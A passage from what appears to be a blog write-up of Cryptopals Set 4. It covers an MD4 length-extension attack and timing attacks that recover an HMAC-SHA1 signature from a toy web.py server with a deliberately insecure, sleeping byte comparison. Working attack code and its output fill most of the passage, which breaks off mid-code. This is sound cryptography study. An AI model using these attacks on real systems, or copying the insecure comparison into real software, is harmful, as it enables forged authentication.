                A <span style="color:#f92672">=</span> left_rotate((A <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_H(B, C, D) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6ed9eba1</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">3</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
                D <span style="color:#f92672">=</span> left_rotate((D <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_H(A, B, C) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6ed9eba1</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">9</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
                C <span style="color:#f92672">=</span> left_rotate((C <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_H(D, A, B) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6ed9eba1</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">11</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
                B <span style="color:#f92672">=</span> left_rotate((B <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_H(C, D, A) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6ed9eba1</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">15</span>)

        self<span style="color:#f92672">.</span>A <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>A <span style="color:#f92672">+</span> A) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        self<span style="color:#f92672">.</span>B <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>B <span style="color:#f92672">+</span> B) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        self<span style="color:#f92672">.</span>C <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>C <span style="color:#f92672">+</span> C) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        self<span style="color:#f92672">.</span>D <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>D <span style="color:#f92672">+</span> D) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">digest</span>(self: object) <span style="color:#f92672">-&gt;</span> bytes:
        <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;4I&#39;</span>, self<span style="color:#f92672">.</span>A, self<span style="color:#f92672">.</span>B, self<span style="color:#f92672">.</span>C, self<span style="color:#f92672">.</span>D)

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex_digest</span>(self: object) <span style="color:#f92672">-&gt;</span> bytes:
        <span style="color:#66d9ef">return</span> binascii<span style="color:#f92672">.</span>hexlify(self<span style="color:#f92672">.</span>digest())<span style="color:#f92672">.</span>decode()
</code></pre></div><p>The padding scheme is very similar to SHA-1 — the only difference being that the length is added on as big-endian packed instead of little-endian packed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">md_pad</span>(message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Pads the given message the same way the pre-processing of the MD4 algorithm does.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    ml <span style="color:#f92672">=</span> len(message) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>

    message <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>
    message <span style="color:#f92672">+=</span> bytes((<span style="color:#ae81ff">56</span> <span style="color:#f92672">-</span> len(message) <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>)
    message <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, ml)

    <span style="color:#66d9ef">return</span> message
    
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">validate</span>(modified_message: bytes, new_md: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Verifies if the padding is correct.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> MD4(modified_message)<span style="color:#f92672">.</span>hex_digest() <span style="color:#f92672">==</span> new_md:
        <span style="color:#66d9ef">return</span> True
    <span style="color:#66d9ef">return</span> False
</code></pre></div><p>We follow the same approach as the previous question: initialising a new instance of the oracle with an already existing, valid state derived from a valid hash.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">md4_length_extension_attack</span>(message: bytes, original_md: bytes, payload: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Performs the length extension attack on an MD4.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> key_length <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
        h <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;4I&#39;</span>, bytes<span style="color:#f92672">.</span>fromhex(original_md))
        modified_message <span style="color:#f92672">=</span> md_pad(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>key_length <span style="color:#f92672">+</span> message)[key_length:] <span style="color:#f92672">+</span> payload
        new_md <span style="color:#f92672">=</span> MD4(payload, (len(modified_message) <span style="color:#f92672">+</span> key_length)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, h[<span style="color:#ae81ff">0</span>], h[<span style="color:#ae81ff">1</span>], h[<span style="color:#ae81ff">2</span>], h[<span style="color:#ae81ff">3</span>])<span style="color:#f92672">.</span>hex_digest()
        <span style="color:#66d9ef">if</span> validate(modified_message, new_md):
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Length extension attack successful.&#34;</span>)
            <span style="color:#66d9ef">return</span> modified_message, new_md
            <span style="color:#66d9ef">break</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">original_md <span style="color:#f92672">=</span> MD4(message<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hex_digest()
modified_message, new_md <span style="color:#f92672">=</span> md4_length_extension_attack(message<span style="color:#f92672">.</span>encode(), original_md, payload)
</code></pre></div><p><code>&gt; Length extension attack successful.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-31-implement-and-break-hmac-sha1-with-an-artificial-timing-leak">Challenge 31: Implement and break HMAC-SHA1 with an artificial timing leak</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/31">Link</a></p>
<blockquote>
<p>The psuedocode on Wikipedia should be enough. HMAC is very easy.<br>
Using the web framework of your choosing (Sinatra, web.py, whatever), write a tiny application that has a URL that takes a &ldquo;file&rdquo; argument and a &ldquo;signature&rdquo; argument, like so:<br>
<strong>http://localhost:9000/test?file=foo&amp;signature=46b4ec586117154dacd49d664e5d63fdc88efb51</strong><br>
Have the server generate an HMAC key, and then verify that the &ldquo;signature&rdquo; on incoming requests is valid for &ldquo;file&rdquo;, using the &ldquo;==&rdquo; operator to compare the valid MAC for a file with the &ldquo;signature&rdquo; parameter (in other words, verify the HMAC the way any normal programmer would verify it).<br>
Write a function, call it &ldquo;insecure_compare&rdquo;, that implements the == operation by doing byte-at-a-time comparisons with early exit (ie, return false at the first non-matching byte).<br>
In the loop for &ldquo;insecure_compare&rdquo;, add a 50ms sleep (sleep 50ms after each byte).<br>
Use your &ldquo;insecure_compare&rdquo; function to verify the HMACs on incoming requests, and test that the whole contraption works. Return a 500 if the MAC is invalid, and a 200 if it&rsquo;s OK.<br>
Using the timing leak in this application, write a program that discovers the valid MAC for any file.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> web
<span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> hashlib
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
delay <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.05</span>
</code></pre></div><p><a href="https://en.wikipedia.org/wiki/HMAC">HMAC</a> (<strong>keyed-Hash Message Authentication Code</strong> or <strong>Hash-based Message Authentication Code</strong>) is a specific type of MAC devised in order to overcome the broken approach used to generate MACs. Any cryptographic hash function, such as SHA-256, may be used in the calculation of an HMAC; the resulting MAC algorithm is termed <strong>HMAC-X</strong>, where X is the hash function used (e.g. HMAC-SHA256).</p>
<p>HMAC uses the key to derive two internal keys - inner and outer. It makes two passes to compute the final hash. The first pass uses the inner key and the message to produce an internal state(hash), and the second pass uses this state and the outer key to produce the final hash. Thus the algorithm provides better immunity against length extension attacks.</p>
<p>NOTE: HMAC does not encrypt the message. It&rsquo;s sole purpose is to provide an integrity check functionality. The message therefore (encrypted or not) must be sent with the HMAC hash. Parties with the secret key will hash the message again themselves, and if it is authentic, the received and computed hashes will match.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">HMAC</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Computes the HMAC for the hash function given at the time of initialisation.
</span><span style="color:#e6db74">    This implementation resembles the one of the Wikipedia pseudo-code.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#66d9ef">def</span> __init__(self: object, random_key: bytes, hash_func: callable):
        self<span style="color:#f92672">.</span>hash_func <span style="color:#f92672">=</span> hash_func
        self<span style="color:#f92672">.</span>block_size <span style="color:#f92672">=</span> hash_func()<span style="color:#f92672">.</span>block_size

        <span style="color:#66d9ef">if</span> len(random_key) <span style="color:#f92672">&gt;</span> self<span style="color:#f92672">.</span>block_size:
            self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> hash_func(random_key)<span style="color:#f92672">.</span>digest()
        <span style="color:#66d9ef">elif</span> len(random_key) <span style="color:#f92672">&lt;</span> self<span style="color:#f92672">.</span>block_size:
            self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> random_key <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (self<span style="color:#f92672">.</span>block_size<span style="color:#f92672">-</span>len(random_key))

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compute</span>(self: object, message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
        o_key_pad <span style="color:#f92672">=</span> xor_bytes(self<span style="color:#f92672">.</span>key, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5c</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> self<span style="color:#f92672">.</span>block_size)
        i_key_pad <span style="color:#f92672">=</span> xor_bytes(self<span style="color:#f92672">.</span>key, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x36</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> self<span style="color:#f92672">.</span>block_size)
        
        inner_hash <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>hash_func(i_key_pad <span style="color:#f92672">+</span> message)<span style="color:#f92672">.</span>digest()
        
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>hash_func(o_key_pad <span style="color:#f92672">+</span> inner_hash)<span style="color:#f92672">.</span>hexdigest()
</code></pre></div><p>I used web.py to create the server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">urls <span style="color:#f92672">=</span> (
    <span style="color:#e6db74">&#39;/hello&#39;</span>, <span style="color:#e6db74">&#39;Hello&#39;</span>,
    <span style="color:#e6db74">&#39;/test&#39;</span>, <span style="color:#e6db74">&#39;Hash&#39;</span>
)

app <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>application(urls, globals())

HMAC_obj <span style="color:#f92672">=</span> HMAC(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;YELLOW_SUBMARINE&#34;</span>, hashlib<span style="color:#f92672">.</span>sha1)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span>:        
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        name <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>name
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name:
            name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;World&#39;</span>
            
        string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello, &#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&#34;</span>
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;name&#34;</span> : string}

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hash</span>:
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_insecure_compare</span>(self, hash1, hash2, delay):
        <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(hash1, hash2):
            <span style="color:#66d9ef">if</span> b1 <span style="color:#f92672">!=</span> b2:
                <span style="color:#66d9ef">return</span> False
            time<span style="color:#f92672">.</span>sleep(delay)
        <span style="color:#66d9ef">return</span> True
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        <span style="color:#66d9ef">global</span> HMAC_obj
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        file <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>file
        signature <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>signature
        delay <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>delay
        
        hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(file<span style="color:#f92672">.</span>encode())
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_insecure_compare(hmac<span style="color:#f92672">.</span>encode(), signature<span style="color:#f92672">.</span>encode(), float(delay)):
            <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>HTTPError(<span style="color:#ae81ff">200</span>)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>HTTPError(<span style="color:#ae81ff">500</span>)
</code></pre></div><p>Test the web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">response1 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=&#34;</span>)
<span style="color:#66d9ef">print</span>(response1<span style="color:#f92672">.</span>data)

response2 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=hexterisk&#34;</span>)
<span style="color:#66d9ef">print</span>(json<span style="color:#f92672">.</span>loads(response2<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>)))
</code></pre></div><p><code>b&quot;{'name': 'Hello, World!'}&quot;</code><br>
<code>{'name': 'Hello, hexterisk!'}</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;foo&#34;</span>
signature <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;274b7c4d98605fcf739a0bf9237551623f415fb8&#34;</span>
response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/test?delay=&#34;</span> <span style="color:#f92672">+</span> str(delay) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;file=&#34;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;signature=&#34;</span> <span style="color:#f92672">+</span> signature)
<span style="color:#66d9ef">print</span>(response)

signature <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8c80a95a8e72b3e822a13924553351a433e267d8&#34;</span>
response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/test?delay=&#34;</span> <span style="color:#f92672">+</span> str(delay) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;file=&#34;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;signature=&#34;</span> <span style="color:#f92672">+</span> signature)
<span style="color:#66d9ef">print</span>(response)
</code></pre></div><p><code>&lt;Storage {'status': 500, 'headers': {}, 'header_items': [], 'data': b'500'}&gt;</code><br>
<code>&lt;Storage {'status': 200, 'headers': {}, 'header_items': [], 'data': b'200'}&gt;</code></p>
<p><img src="/Cryptopals_Set_4/1_image.png" alt="&ldquo;timing_attack&rdquo;">
<em>Classical timing attack.</em></p>
<p>It&rsquo;s a classical timing attack. We brute force all the bytes of the hash by judging the response time. Every byte check causes some delay. If for some byte the response comes back with a little more delay than all others, then it&rsquo;s clear that this byte triggered the byte check for the next byte, and thus this byte was guessed correctly. Slowly the whole signature is built this way.</p>
<p>The function produces a 160-bit (20-byte) hash value known as a message digest, typically rendered as a hexadecimal number, 40 digits long.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">signature <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#75715e"># We go for twice the size because hexadecimal byte is 2 digits long.</span>
<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(hashlib<span style="color:#f92672">.</span>sha1()<span style="color:#f92672">.</span>digest_size <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>):
    
    times <span style="color:#f92672">=</span> []
    <span style="color:#75715e"># This loop goes over all 16 hexadecimal bytes.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
        start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
        response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/test?delay=&#34;</span> <span style="color:#f92672">+</span> str(delay) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;file=&#34;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;signature=&#34;</span> <span style="color:#f92672">+</span> signature <span style="color:#f92672">+</span> hex(i)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
        finish <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
        times<span style="color:#f92672">.</span>append(finish <span style="color:#f92672">-</span> start)
    signature <span style="color:#f92672">+=</span> hex(times<span style="color:#f92672">.</span>index(max(times)))[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Discovered signature:&#34;</span>, signature)    
    response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/test?delay=&#34;</span> <span style="color:#f92672">+</span> str(delay) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;file=&#34;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;signature=&#34;</span> <span style="color:#f92672">+</span> signature <span style="color:#f92672">+</span> hex(i)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Brute force successful.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; Signature:&#34;</span>, signature)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Brute force failed.&#34;</span>)
</code></pre></div><p><code>&gt; Discovered signature: 8</code><br>
<code>&gt; Discovered signature: 8c</code><br>
<code>&gt; Discovered signature: 8c8</code><br>
<code>&gt; Discovered signature: 8c80</code><br>
<code>&gt; Discovered signature: 8c80a</code><br>
<code>&gt; Discovered signature: 8c80a9</code><br>
<code>&gt; Discovered signature: 8c80a95</code><br>
<code>&gt; Discovered signature: 8c80a95a</code><br>
<code>&gt; Discovered signature: 8c80a95a8</code><br>
<code>&gt; Discovered signature: 8c80a95a8e</code><br>
<code>&gt; Discovered signature: 8c80a95a8e7</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e8</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e82</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1392</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a139245</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1392455</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a139245533</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a1392455335</code><br>
<code>&gt; Discovered signature:  8c80a95a8e72b3e822a13924553351</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a4</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a43</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e2</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e26</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e267</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e267d</code><br>
<code>&gt; Discovered signature: 8c80a95a8e72b3e822a13924553351a433e267d8</code><br>
<code>&gt; Brute force successful.</code><br>
<code>&gt; Signature: 8c80a95a8e72b3e822a13924553351a433e267d8</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-32-break-hmac-sha1-with-a-slightly-less-artificial-timing-leak">Challenge 32: Break HMAC-SHA1 with a slightly less artificial timing leak</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/32">Link</a></p>
<blockquote>
<p>Reduce the sleep in your &ldquo;insecure_compare&rdquo; until your previous solution breaks. (Try 5ms to start.) Now break it again.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># Given</span>
    delay <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.005</span>
    HMAC_obj <span style="color:#f92672">=</span> HMAC(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;YELLOW_SUBMARINE&#34;</span>, hashlib<span style="color:#f92672">.</span>sha1)
    file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;foo&#34;</span>
</code></pre></div><p>The question is same as the previous one, the only difference being that the delay has been made smaller.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">signature <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(hashlib<span style="color:#f92672">.</span>sha1()<span style="color:#f92672">.</span>digest_size <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>):
<span style="color:#75715e"># We go for twice the size because hexadecimal byte is 2 digits long.</span>
    times <span style="color:#f92672">=</span> []
    <span style="color:#75715e"># This loop goes over all 16 hexadecimal bytes.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
        runtime <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        <span style="color:#75715e"># Introduced more rounds so the time difference is prominent</span>
        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
            start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
            response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/test?delay=&#34;</span> <span style="color:#f92672">+</span> str(delay) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;file=&#34;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;signature=&#34;</span> <span style="color:#f92672">+</span> signature <span style="color:#f92672">+</span> hex(i)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
            finish <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
            runtime <span style="color:#f92672">+=</span> finish <span style="color:#f92672">-</span> start
        times<span style="color:#f92672">.</span>append(runtime)
    signature <span style="color:#f92672">+=</span> hex(times<span style="color:#f92672">.</span>index(max(times)))[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Discovered signature:&#34;</span>, signature)

response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/test?delay=&#34;</span> <span style="color:#f92672">+</span> str(delay) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;file=&#34;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;amp;amp;amp;amp;amp;signature=&#34;</span> <span style="color:#f92672">+</span> signature <span style="color:#f92672">+</span> hex(i)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
<span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
